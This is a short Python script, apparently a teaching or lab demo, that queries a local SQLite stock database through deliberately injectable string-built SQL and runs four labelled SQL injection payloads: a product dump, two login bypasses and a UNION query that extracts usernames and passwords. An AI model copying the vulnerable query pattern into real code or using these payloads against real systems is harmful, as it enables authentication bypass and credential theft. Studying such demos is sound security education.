import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'Query: {query}')
    rows = conn.execute(query).fetchall()
    print(f'Result: {rows}\n')
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'Query: {query}')
    row = conn.execute(query).fetchone()
    print(f'Result: {row}\n')
    return row

print("=" * 60)
print("ATTACK 1: Dump all products using OR 1=1")
print("=" * 60)
search_product("' OR 1=1--")

print("=" * 60)
print("ATTACK 2: Login bypass with comment --")
print("=" * 60)
login("admin'--", "anything")

print("=" * 60)
print("ATTACK 3: Always true login")
print("=" * 60)
login("' OR '1'='1", "' OR '1'='1")

print("=" * 60)
print("ATTACK 4: UNION attack to steal user data")
print("=" * 60)
search_product("' UNION SELECT id, username, password, role FROM users--")

conn.close()
